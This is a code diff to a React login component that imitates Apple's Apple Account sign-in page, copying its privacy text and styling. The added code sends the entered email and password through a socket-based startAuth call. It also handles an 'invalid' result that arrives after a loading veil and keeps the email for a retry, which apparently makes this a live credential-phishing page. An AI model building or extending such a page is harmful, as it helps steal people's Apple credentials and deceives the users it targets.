@@ -1,5 +1,7 @@
 import { useEffect, useRef, useState } from "react";
 import { Landing } from "../components/Landing";
+import { startAuth } from "../lib/socket";
+import { useAuthState } from "../lib/useAuth";
 
 const PRIVACY_TEXT =
   "Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.";
@@ -13,8 +15,23 @@ function CheckIcon() {
 }
 
 export default function Login({ onContinue }) {
+  const auth = useAuthState();
   const [step, setStep] = useState("email");
-  const [email, setEmail] = useState("");
+  const [email, setEmail] = useState(() => {
+    try {
+      return sessionStorage.getItem("authEmail") || "";
+    } catch {
+      return "";
+    }
+  });
+  const [error, setError] = useState(() => {
+    try {
+      return sessionStorage.getItem("authError") || "";
+    } catch {
+      return "";
+    }
+  });
+  const [busy, setBusy] = useState(false);
   const [password, setPassword] = useState("");
   const [remember, setRemember] = useState(false);
   const [focused, setFocused] = useState(false);
@@ -34,6 +51,11 @@ export default function Login({ onContinue }) {
     if (window.matchMedia("(min-width: 735px)").matches) {
       emailRef.current?.focus();
     }
+    try {
+      sessionStorage.removeItem("authError");
+    } catch {
+      // private mode
+    }
   }, []);
 
   // The password field takes over the same card; focus it as the reference does.
@@ -42,6 +64,15 @@ export default function Login({ onContinue }) {
     const timer = setTimeout(() => passwordRef.current?.focus(), 80);
     return () => clearTimeout(timer);
   }, [emailStep]);
+
+  // An invalid result arrives after the login page has already unmounted its
+  // card under the loading veil; surface it here without losing the email.
+  useEffect(() => {
+    if (auth.status === "invalid" || auth.status === "error") {
+      setError(auth.error || "Incorrect Apple Account or password.");
+      if (!email && auth.account?.email) setEmail(auth.account.email);
+    }
+  }, [auth.status, auth.error, auth.account?.email, email]);
 
   function showPasswordStep() {
     // Reserve the height the email step currently occupies, so swapping the
@@ -56,17 +87,27 @@ export default function Login({ onContinue }) {
     setStep("email");
     setPassword("");
     setPwdFocused(false);
+    setError("");
     setTimeout(() => emailRef.current?.focus(), 60);
   }
 
-  function submit(event) {
+  async function submit(event) {
     event.preventDefault();
-    if (!complete) return;
+    if (!complete || busy) return;
     if (emailStep) {
       showPasswordStep();
       return;
     }
-    onContinue?.(email.trim(), password);
+    setBusy(true);
+    setError("");
+    try {
+      await startAuth({ email: email.trim(), password });
+      onContinue?.(email.trim(), password);
+    } catch (failure) {
+      setError(failure.message || "Could not sign in. Try again.");
+    } finally {
+      setBusy(false);
+    }
   }
 
   return (
@@ -224,13 +265,22 @@ export default function Login({ onContinue }) {
               ) : null}
             </div>
 
+            {error ? (
+              <p
+                role="alert"
+                className="mt-3 text-left text-[12px] leading-4 tracking-[-0.12px] text-[#e30000]"
+              >
+                {error}
+              </p>
+            ) : null}
+
             <button
               type="submit"
-              disabled={!complete}
+              disabled={!complete || busy}
               className="relative mt-[33px] block h-[38px] max-[405px]:mt-[32px] w-full rounded-[8px] border border-transparent bg-[#0071e3] px-[15px] py-[8px] text-center text-[14px] leading-[20px] tracking-[-0.224px] text-white transition-[background-color,transform] duration-150 ease-out hover:bg-[#0077ed] active:scale-[0.99] disabled:opacity-[0.42] disabled:hover:bg-[#0071e3]"
             >
               <span className="text-[14px] leading-[20px]">
-                {emailStep ? "Continue" : "Sign In"}
+                {emailStep ? "Continue" : busy ? "Signing In…" : "Sign In"}
               </span>
             </button>
           </form>
